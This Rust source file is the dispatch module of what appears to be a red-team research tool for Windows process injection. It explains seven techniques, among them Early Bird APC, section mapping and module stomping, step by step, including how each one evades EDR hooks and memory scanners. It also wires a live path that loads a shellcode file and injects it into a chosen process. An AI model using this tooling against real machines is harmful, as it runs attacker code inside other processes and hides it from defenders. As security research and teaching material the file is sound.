pub mod apc;
pub mod callback;
mod common;
pub mod crt;
pub mod earlybird;
pub mod hijack;
pub mod section;
pub mod stomp;
pub mod wrappers;

use crate::log::LogSink;

#[allow(dead_code)]
#[allow(clippy::upper_case_acronyms)]
#[derive(Debug, Clone, PartialEq)]
pub enum InjectionTechnique {
    CreateRemoteThread,
    APC,
    ThreadHijack,
    EarlyBird,
    SectionMapping,
    Callback,
    ModuleStomp,
}

impl InjectionTechnique {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "createremote" | "createremotethread" => Some(Self::CreateRemoteThread),
            "apc" | "apcinjection" => Some(Self::APC),
            "hijack" | "threadhijack" | "threadhijacking" | "setthreadcontext" => {
                Some(Self::ThreadHijack)
            }
            "earlybird" | "early_bird" | "early-bird" => Some(Self::EarlyBird),
            "section" | "sectionmapping" | "mapview" | "ntmapviewofsection" => {
                Some(Self::SectionMapping)
            }
            "callback" | "enumwindows" | "timerqueue" | "threadpool" => Some(Self::Callback),
            "stomp" | "modulestomp" | "dllstomp" => Some(Self::ModuleStomp),
            _ => None,
        }
    }

    pub fn name(&self) -> &str {
        match self {
            Self::CreateRemoteThread => "CreateRemoteThread",
            Self::APC => "APC Injection",
            Self::ThreadHijack => "Thread Hijack (SetThreadContext)",
            Self::EarlyBird => "Early Bird APC",
            Self::SectionMapping => "Section Mapping (MapViewOfFile)",
            Self::Callback => "Callback Execution (EnumWindows)",
            Self::ModuleStomp => "Module Stomping",
        }
    }
}

#[derive(Debug)]
pub struct InjectionResult {
    pub remote_base: u64,
    pub size: usize,
}

pub fn analyze(technique: &str, log: &LogSink) {
    dry_run(0, technique, log);
}

pub fn dry_run(pid: u32, technique: &str, log: &LogSink) {
    if let Some(t) = InjectionTechnique::from_str(technique) {
        log.info(format!("  Target PID: {}", pid));
        log.info(format!("  Technique: {}", t.name()));

        match t {
            InjectionTechnique::CreateRemoteThread => {
                log.detail("  Steps:");
                log.detail("    1. OpenProcess (PROCESS_ALL_ACCESS) on target PID");
                log.detail("    2. NtAllocateVirtualMemory / VirtualAllocEx in target process");
                log.detail("    3. NtWriteVirtualMemory / WriteProcessMemory to write payload");
                log.detail("    4. NtProtectVirtualMemory to set PAGE_EXECUTE_READ");
                log.detail("    5. NtCreateThreadEx / CreateRemoteThread to execute");
                log.detail("    6. WaitForSingleObject to wait for completion");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - ALL of these APIs are heavily hooked by EDRs");
                log.warning("    - RWX memory pages are a major indicator");
                log.warning("    - Cross-process memory writes are monitored");
                log.warning("    - Remote thread creation is a key indicator");
            }
            InjectionTechnique::APC => {
                log.detail("  Steps:");
                log.detail("    1. OpenProcess on target PID");
                log.detail("    2. Allocate + write memory in target");
                log.detail("    3. Enumerate threads via NtGetNextThread / Thread32First");
                log.detail("    4. Queue APC to target thread via NtQueueApcThread");
                log.detail("    5. APC executes when thread enters alertable state");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - APC queue manipulation is monitored");
                log.warning("    - Thread enumeration across processes is flagged");
                log.warning("    - Memory allocation + write + APC queue = strong signal");
            }
            InjectionTechnique::ThreadHijack => {
                log.detail("  Steps:");
                log.detail("    1. OpenProcess on target PID");
                log.detail("    2. SuspendThread on target thread");
                log.detail("    3. Allocate + write memory in target");
                log.detail("    4. SetThreadContext to redirect thread to injected code");
                log.detail("    5. ResumeThread to execute");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - Thread suspension + context modification is monitored");
                log.warning("    - Suspended threads are a known indicator");
                log.warning("    - Memory write + context change = strong signal");
            }
            InjectionTechnique::EarlyBird => {
                log.detail("  Steps:");
                log.detail("    1. CreateProcessW with CREATE_SUSPENDED — spawn sacrificial process");
                log.detail("    2. VirtualAllocEx — allocate memory in suspended child");
                log.detail("    3. WriteProcessMemory — write shellcode");
                log.detail("    4. VirtualProtectEx — set PAGE_EXECUTE_READ");
                log.detail("    5. QueueUserAPC — queue to the suspended main thread");
                log.detail("    6. ResumeThread — thread starts, APC fires before EDR hooks");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - CREATE_SUSPENDED + APC is a known pattern");
                log.warning("    - Some EDRs hook NtResumeThread to scan queued APCs");
                log.warning("    - Process creation itself is monitored");
                log.warning("    - Key advantage: runs before user-mode hooks install");
            }
            InjectionTechnique::SectionMapping => {
                log.detail("  Steps:");
                log.detail("    1. CreateFileMappingW — anonymous shared section (PAGE_EXECUTE_READWRITE)");
                log.detail("    2. MapViewOfFile — map section into local process (writable)");
                log.detail("    3. memcpy — write shellcode to local view (no WriteProcessMemory!)");
                log.detail("    4. MapViewOfFileNuma2 — map same section into target (PAGE_EXECUTE_READ)");
                log.detail("    5. CreateRemoteThread — execute shellcode in target");
                log.detail("    6. WaitForSingleObject — wait for completion");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - WriteProcessMemory is NEVER called — bypasses hooks on it");
                log.warning("    - Shared section creation + cross-process mapping is monitored");
                log.warning("    - CreateRemoteThread is still used for execution");
                log.warning("    - Key advantage: memory write happens locally, not cross-process");
            }
            InjectionTechnique::Callback => {
                log.detail("  Steps:");
                log.detail("    1. VirtualAlloc(PAGE_READWRITE) — allocate local memory");
                log.detail("    2. Copy shellcode bytes to allocated region");
                log.detail("    3. VirtualProtect(PAGE_EXECUTE_READ) — make executable");
                log.detail("    4. Cast address to WNDENUMPROC callback");
                log.detail("    5. EnumWindows(callback, 0) — Windows calls shellcode per window");
                log.detail("    6. Shellcode returns FALSE to stop enumeration");
                log.info("");
                log.warning("  Detection:");
                log.warning("    - No CreateRemoteThread or CreateThread — callback mechanism");
                log.warning("    - VirtualAlloc + VirtualProtect pattern is still flagged");
                log.warning("    - EnumWindows callback from non-module memory is suspicious");
                log.warning("    - Key advantage: no thread creation APIs called");
            }
            InjectionTechnique::ModuleStomp => {
                log.detail("  Steps:");
                log.detail("    1. LoadLibraryExA(victim.dll, DONT_RESOLVE_DLL_REFERENCES)");
                log.detail("    2. Parse PE → find .text section (base + size)");
                log.detail("    3. VirtualProtect(.text, PAGE_READWRITE)");
                log.detail("    4. Overwrite .text with shellcode bytes");
                log.detail("    5. VirtualProtect(.text, PAGE_EXECUTE_READ)");
                log.info("");
                log.detail(format!("  Victim DLL: {} (large .text, rarely used)", stomp::victim_dll()));
                log.info("");
                log.warning("  Detection:");
                log.warning("    - Shellcode lives in memory backed by a signed DLL");
                log.warning("    - Memory scanners see legitimate module, not anonymous RWX");
                log.warning("    - DLL load without init (DONT_RESOLVE_DLL_REFERENCES) is noted");
                log.warning("    - Key advantage: shellcode hides inside a Microsoft-signed module");
            }
        }
    } else {
        log.error(format!("  Unknown technique: {}", technique));
        log.info("  Known techniques: createremote, apc, hijack, earlybird, section, callback, stomp");
    }
}

pub fn print_info(log: &LogSink) {
    log.info("");
    log.info("=== Process Injection Techniques ===");
    log.info("");
    log.info("What it does:");
    log.detail("  Inserts code into another process's address space and executes it.");
    log.detail("  This is a fundamental technique for malware, red teams, and");
    log.detail("  security research. EDRs detect this through API hooking and");
    log.detail("  behavioral analysis.");
    log.info("");
    log.info("Techniques implemented:");
    log.info("  1. CreateRemoteThread");
    log.detail("     - Classic remote thread creation via NtCreateThreadEx");
    log.detail("     - Allocate memory in target, write payload, execute");
    log.warning("     - Heavily detected — almost all EDRs hook these APIs");
    log.info("");
    log.info("  2. APC Injection");
    log.detail("     - Queue an APC to a target thread");
    log.detail("     - Code executes when thread enters alertable state");
    log.warning("     - Also heavily monitored");
    log.info("");
    log.info("  3. Thread Hijack (SetThreadContext)");
    log.detail("     - Suspend a thread, modify its context to point to injected code");
    log.detail("     - Resume thread to execute");
    log.warning("     - Suspended thread manipulation is monitored");
    log.info("");
    log.info("  4. Early Bird APC");
    log.detail("     - Create a new process in suspended state");
    log.detail("     - Queue APC to main thread BEFORE it starts");
    log.detail("     - APC fires during process initialization, before EDR hooks");
    log.warning("     - CREATE_SUSPENDED + APC pattern is increasingly detected");
    log.info("");
    log.info("  5. Section Mapping (MapViewOfFile)");
    log.detail("     - Create shared memory section, map locally, write shellcode");
    log.detail("     - Map same section into target — no WriteProcessMemory");
    log.detail("     - Execute via CreateRemoteThread");
    log.warning("     - Bypasses WriteProcessMemory hooks, but CRT is still visible");
    log.info("");
    log.info("  6. Callback Execution (EnumWindows)");
    log.detail("     - Alloc + write + protect shellcode in local process");
    log.detail("     - Cast to WNDENUMPROC, call EnumWindows → shellcode fires");
    log.detail("     - No CreateRemoteThread, no CreateThread");
    log.warning("     - Callback from non-module memory is suspicious");
    log.info("");
    log.info("  7. Module Stomping");
    log.detail("     - Load a legitimate signed DLL without init");
    log.detail("     - Overwrite its .text section with shellcode");
    log.detail("     - Shellcode lives inside a Microsoft-signed module in memory");
    log.warning("     - Defeats memory scanners looking for anonymous executable pages");
    log.info("");
    log.warning("Detection considerations:");
    log.warning("  - All these techniques are WELL KNOWN to EDR vendors");
    log.warning("  - Modern EDRs hook the underlying NT APIs");
    log.warning("  - Behavioral analysis looks for the injection pattern");
    log.warning("  - RWX memory pages are a major red flag");
    log.warning("  - Cross-process operations are heavily monitored");
    log.warning("  - This is an arms race — techniques evolve, EDRs adapt");
    log.info("");
    log.info("Ethical note:");
    log.detail("  These techniques are used by malware AND by security researchers.");
    log.detail("  Understanding them is essential for defense. Use responsibly.");
    log.info("");
}

pub fn load_payload(path: &str) -> Result<Vec<u8>, String> {
    std::fs::read(path).map_err(|e| format!("failed to read payload file '{}': {}", path, e))
}

pub fn live_inject(
    pid: u32,
    technique: &InjectionTechnique,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    if shellcode.is_empty() {
        return Err("shellcode is empty — nothing to inject".to_string());
    }
    let skip_pid = matches!(
        technique,
        InjectionTechnique::EarlyBird | InjectionTechnique::Callback | InjectionTechnique::ModuleStomp
    );
    if !skip_pid {
        crate::safety::validate_target(pid)
            .map_err(|e| format!("target validation failed: {}", e))?;
    }
    match technique {
        InjectionTechnique::CreateRemoteThread => crt::live_inject(pid, shellcode, log),
        InjectionTechnique::APC => apc::live_inject(pid, shellcode, log),
        InjectionTechnique::ThreadHijack => hijack::live_inject(pid, shellcode, log),
        InjectionTechnique::EarlyBird => {
            earlybird::live_inject(shellcode, "C:\\Windows\\System32\\notepad.exe", log)
        }
        InjectionTechnique::SectionMapping => section::live_inject(pid, shellcode, log),
        InjectionTechnique::Callback => callback::live_inject(shellcode, log),
        InjectionTechnique::ModuleStomp => stomp::live_inject(shellcode, log),
    }
}

pub fn live_inject_early_bird(
    shellcode: &[u8],
    target_exe: &str,
    log: &LogSink,
) -> Result<InjectionResult, String> {
    if shellcode.is_empty() {
        return Err("shellcode is empty — nothing to inject".to_string());
    }
    earlybird::live_inject(shellcode, target_exe, log)
}

pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, log: &LogSink) {
    let shellcode = match load_payload(payload_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            log.error(format!("ERROR: {}", e));
            return;
        }
    };
    let technique = match InjectionTechnique::from_str(technique_name) {
        Some(t) => t,
        None => {
            log.error(format!(
                "ERROR: unknown injection technique '{}'",
                technique_name
            ));
            log.info("Known techniques: createremote, apc, hijack, earlybird, section");
            return;
        }
    };
    log.info("");
    log.step(format!("=== LIVE INJECTION — {} ===", technique.name()));
    log.info(format!(
        "  Payload: {} ({} bytes)",
        payload_path,
        shellcode.len()
    ));
    let no_pid = matches!(
        technique,
        InjectionTechnique::EarlyBird | InjectionTechnique::Callback | InjectionTechnique::ModuleStomp
    );
    if no_pid {
        log.info("  Mode: local execution (PID not required)");
    } else {
        log.info(format!("  Target PID: {}", pid));
    }
    log.warning("  WARNING: this performs REAL Win32 calls against a live process.");
    log.warning("  Proceed only in an authorized, isolated research environment.");
    log.info("");
    match live_inject(pid, &technique, &shellcode, log) {
        Ok(result) => {
            log.info("");
            log.step("[DONE] Injection chain completed.");
            log.info(format!(
                "  Shellcode lives at remote address 0x{:X} ({} bytes)",
                result.remote_base, result.size
            ));
            log.info("  Use 'cleanup' to free remote memory when done.");
        }
        Err(e) => {
            log.info("");
            log.error(format!("[FAILED] Injection chain aborted: {}", e));
        }
    }
}

pub fn cleanup_remote(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
    common::cleanup(pid, remote_base, size, log);
}
